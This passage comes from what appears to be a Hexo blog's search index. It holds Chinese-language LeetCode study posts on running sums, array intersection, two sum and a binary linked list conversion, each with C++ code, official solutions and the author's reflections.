        <tag>php</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>一维数组的动态和</title>
    <url>/2020/11/06/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/running-sum-of-1d-array/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>一维数组的动态和</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>nums</code> 。数组「动态和」的计算公式为：<code>runningSum[i] = sum(nums[0]…nums[i])</code> 。</p>
<p>请返回 <code>nums</code> 的动态和。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4]</span><br><span class="line">输出：[1,3,6,10]</span><br><span class="line">解释：动态和计算过程为 [1, 1+2, 1+2+3, 1+2+3+4] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,1,1,1]</span><br><span class="line">输出：[1,2,3,4,5]</span><br><span class="line">解释：动态和计算过程为 [1, 1+1, 1+1+1, 1+1+1+1, 1+1+1+1+1] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,1,2,10,1]</span><br><span class="line">输出：[3,4,6,16,17]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>-10^6 &lt;= nums[i] &lt;= 10^6</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组，依次累加</p>
<p><strong>c++代码：</strong>（执行0ms，击败100%，内存8.6M，击败21.53%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">runningSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            nums[i]+=nums[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>也是非常简单的一道题了，不过内存消耗怎么才击败21.53%，我这应该是最优解了吧，难道是剩下没击败的都和我是平局😅，不知道LeetCode平台怎么计算的</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>两个数的交集</title>
    <url>/2020/11/02/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>两个数的交集</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h6><p>给定两个数组，编写一个函数来计算它们的交集。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], nums2 = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">输出：[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [<span class="number">4</span>,<span class="number">9</span>,<span class="number">5</span>], nums2 = [<span class="number">9</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>]</span><br><span class="line">输出：[<span class="number">9</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>输出结果中的每个元素一定是唯一的。</li>
<li>我们可以不考虑输出结果的顺序。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>这道题思路还比较好像，比较明确但是可能不是很简便的方法，使用多重for循环，先遍历nums1中每一个元素在nums2中查找是否存在，若存在再判断是否已经保存在输出结果中了这样可以保证输出结果每个元素的唯一性。</p>
<p><strong>c++代码：</strong>(执行用时56ms，击败5.86%，内存消耗10.2M，击败78.25%)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="comment">//遍历第一个数组中的元素，查找第二个数组中是否存在相同的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.size(); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[i] == nums2[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(result.size() == <span class="number">0</span>) &#123;</span><br><span class="line">                        result.push_back(nums1[i]);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//判断result中是否已经存在</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; result.size(); k++) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(nums1[i] == result[k]) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(k == result.size() - <span class="number">1</span>) &#123;</span><br><span class="line">                                result.push_back(nums1[i]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/solution/liang-ge-shu-zu-de-jiao-ji-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：两个集合</strong></p>
<p>计算两个数组的交集，直观的方法是遍历数组 <code>nums1</code>，对于其中的每个元素，遍历数组 <code>nums2</code> 判断该元素是否在数组 <code>nums2</code> 中，如果存在，则将该元素添加到返回值。假设数组 <code>nums1</code> 和 <code>nums2</code> 的长度分别是 $m$ 和 $n$，则遍历数组 <code>nums1</code> 需要 $O(m)$ 的时间，判断 <code>nums1</code> 中的每个元素是否在数组 <code>nums2</code> 中需要 $O(n)$ 的时间，因此总时间复杂度是 $O(mn)$。</p>
<p>如果使用哈希集合存储元素，则可以在 $O(1)$ 的时间内判断一个元素是否在集合中，从而降低时间复杂度。</p>
<p>首先使用两个集合分别存储两个数组中的元素，然后遍历较小的集合，判断其中的每个元素是否在另一个集合中，如果元素也在另一个集合中，则将该元素添加到返回值。该方法的时间复杂度可以降低到 $O(m+n)$。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; set1, set2;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : nums1) &#123;</span><br><span class="line">            set1.insert(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : nums2) &#123;</span><br><span class="line">            set2.insert(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getIntersection(set1, set2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">getIntersection</span><span class="params">(<span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt;&amp; set1, <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt;&amp; set2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (set1.size() &gt; set2.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> getIntersection(set2, set1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : set1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set2.count(num)) &#123;</span><br><span class="line">                intersection.push_back(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(m+n)$，其中 $m$ 和 $n$ 分别是两个数组的长度。使用两个集合分别存储两个数组中的元素需要 $O(m+n)$ 的时间，遍历较小的集合并判断元素是否在另一个集合中需要 $O(min(m,n))$ 的时间，因此总时间复杂度是 $O(m+n)$。</li>
<li><strong>空间复杂度：</strong>$O(m+n)$，其中 $m$ 和 $n$ 分别是两个数组的长度。空间复杂度主要取决于两个集合。</li>
</ul>
<p><strong>方法二：排序+双指针</strong></p>
<p>如果两个数组是有序的，则可以使用双指针的方法得到两个数组的交集。</p>
<p>首先对两个数组进行排序，然后使用两个指针遍历两个数组。可以预见的是加入答案的数组的元素一定是递增的，为了保证加入元素的唯一性，我们需要额外记录变量 $pre$ 表示上一次加入答案数组的元素。</p>
<p>初始时，两个指针分别指向两个数组的头部。每次比较两个指针指向的两个数组中的数字，如果两个数字不相等，则将指向较小数字的指针右移一位，如果两个数字相等，且该数字不等于 $pre$ ，将该数字添加到答案并更新 $pre$ 变量，同时将两个指针都右移一位。当至少有一个指针超出数组范围时，遍历结束。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        sort(nums1.begin(), nums1.end());</span><br><span class="line">        sort(nums2.begin(), nums2.end());</span><br><span class="line">        <span class="keyword">int</span> length1 = nums1.size(), length2 = nums2.size();</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">            <span class="keyword">int</span> num1 = nums1[index1], num2 = nums2[index2];</span><br><span class="line">            <span class="keyword">if</span> (num1 == num2) &#123;</span><br><span class="line">                <span class="comment">// 保证加入元素的唯一性</span></span><br><span class="line">                <span class="keyword">if</span> (!intersection.size() || num1 != intersection.back()) &#123;</span><br><span class="line">                    intersection.push_back(num1);</span><br><span class="line">                &#125;</span><br><span class="line">                index1++;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num1 &lt; num2) &#123;</span><br><span class="line">                index1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p><strong>时间复杂度：</strong>$O(mlogm+nlogn)$，其中 $m$ 和 $n$ 分别是两个数组的长度。对两个数组排序的时间复杂度分别是$O(mlogm)$ 和 $O(nlogn)$，双指针寻找交集元素的时间复杂度是 $O(m+n)$，因此总时间复杂度是 $O(mlogm+nlogn)$。</p>
</li>
<li><p><strong>空间复杂度：</strong>$O(logm+logn)$，其中 $m$ 和 $n$ 分别是两个数组的长度。空间复杂度主要取决于排序使用的额外空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>看到这道题目，我首先想到的就是那种直观的解法，看完官方题解后发现还是STL模板库没有学好，unordered_set这个容器根本都没见过🤣，本来下午刚看完基础的STL模板库，以为够用了看来还是得学啊，另外对这些容器的底层实现不是很了解还有复杂度分析了解甚少不太会计算复杂度，基本分不清哪些容器的效率差异，或者说自己对这方面还不敏感觉得好像都差不多没那么重要😥，接下来抽时间好好看看STL标准库和STL源码剖析吧，🤯</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>两数之和</title>
    <url>/2020/10/20/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/two-sum/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>两数之和</p>
<p><strong>难度：</strong>⭐</p>
<p><strong>题目描述：</strong></p>
<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>



<p>下面是自己提交通过的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建vector容器，有2个元素，初始值默认为0</span></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">arr</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="comment">//获取容器元素个数</span></span><br><span class="line">        <span class="keyword">int</span> len=nums.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                    arr[<span class="number">0</span>]=i;</span><br><span class="line">                    arr[<span class="number">1</span>]=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义s，类型为Solution</span></span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="comment">//初始化vector容器nums</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums&#123;<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> target=<span class="number">9</span>;</span><br><span class="line">    <span class="comment">//调用对象s的twoSum函数，返回值是vector容器类型</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result=s.twoSum(nums,target);</span><br><span class="line">    <span class="comment">//遍历vector容器</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;[&quot;</span>&lt;&lt;result[<span class="number">0</span>]&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;result[<span class="number">1</span>]&lt;&lt;<span class="string">&quot;]&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>代码是在codeblocks上编写的完整版，提交答案的时候只需要提交Solution类的代码就可以。</p>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>



<p><strong>方法一：暴力枚举</strong><br><strong>思路及算法</strong></p>
<p>最容易想到的方法是枚举数组中的每一个数 <code>x</code>，寻找数组中是否存在 <code>target - x</code>。</p>
<p>当我们使用遍历整个数组的方式寻找 <code>target - x</code> 时，需要注意到每一个位于 <code>x</code> 之前的元素都已经和 <code>x</code> 匹配过，因此不需要再进行匹配。而每一个元素不能被使用两次，所以我们只需要在 <code>x</code> 后面的元素中寻找 <code>target - x</code>。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i, j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：<em>O(N<sup>2</sup>)</em>，其中<em>N</em>是数组中的元素数量。最坏情况下数组中任意两个数都要被匹配一次。</li>
<li>空间复杂度：<em>O(1)</em>。</li>
</ul>
<p><strong>方法二：哈希表</strong><br><strong>思路及算法</strong></p>
<p>注意到方法一的时间复杂度较高的原因是寻找 <code>target - x</code> 的时间复杂度过高。因此，我们需要一种更优秀的方法，能够快速寻找数组中是否存在目标元素。如果存在，我们需要找出它的索引。</p>
<p>使用哈希表，可以将寻找 <code>target - x</code> 的时间复杂度降低到从 <em>O(N)</em> 降低到 <em>O(1)</em>。</p>
<p>这样我们创建一个哈希表，对于每一个 <code>x</code>，我们首先查询哈希表中是否存在 <code>target - x</code>，然后将 <code>x</code> 插入到哈希表中，即可保证不会让 <code>x</code> 和自己匹配。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashtable = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashtable.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;hashtable.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：<em>O(N)</em>，其中N是数组中的元素数量。对于每一个元素<code>x</code>，我们可以<em>O(1)</em>地寻找<code>target-x</code>。</li>
<li>空间复杂度：<em>O(N)</em>，其中<em>N</em>是数组中的元素数量。主要为哈希表的开销。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>



<p>这好像是我在LeetCode平台上面做的第一道题，好久没用C++了，知识点都忘了，最近python写多了编程序时有几个error就是按python语法写的🤣。上周就看这道题了，看到题目已经给出的部分代码，vector容器我没咋用过啊，当时就乱写最后不是这个测试用例不通过就是那个出错，所以我就用了一周多的时间把菜鸟教程上c&amp;c++又学习了一遍，STL标准模板库没来得及看完，就把这道题需要的vector容器看了。提交完答案看官方题解分析，自己用的是第一种方法暴力枚举，效率确实不是很高啊😅；第二种方法是使用了哈希表，确实是一种更优秀的方法，也是属于STL的范畴，看来我还得抽时间赶紧把C++的STL标准模板库给学了。c&amp;c++基础已经复习完了，题目也可以开始刷起来了，希望以后持续的做LeetCode题，将来的你一定会感谢现在拼命的自己，加油🎈</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制链表转整数</title>
    <url>/2020/11/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%93%BE%E8%A1%A8%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个单链表的引用结点 <code>head</code>。链表中每个结点的值不是 0 就是 1。已知此链表是一个整数数字的二进制表示形式。</p>
<p>请你返回该链表所表示数字的 <strong>十进制值</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%93%BE%E8%A1%A8%E8%BD%AC%E6%95%B4%E6%95%B0/graph-1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1,0,1]</span><br><span class="line">输出：5</span><br><span class="line">解释：二进制数 (101) 转化为十进制数 (5)</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [0]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1,0,0,1,0,0,1,1,1,0,0,0,0,0,0]</span><br><span class="line">输出：18880</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [0,0]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>链表不为空。</li>
<li>链表的结点总数不超过 <code>30</code>。</li>
<li>每个结点的值不是 <code>0</code> 就是 <code>1</code>。</li>
</ul>
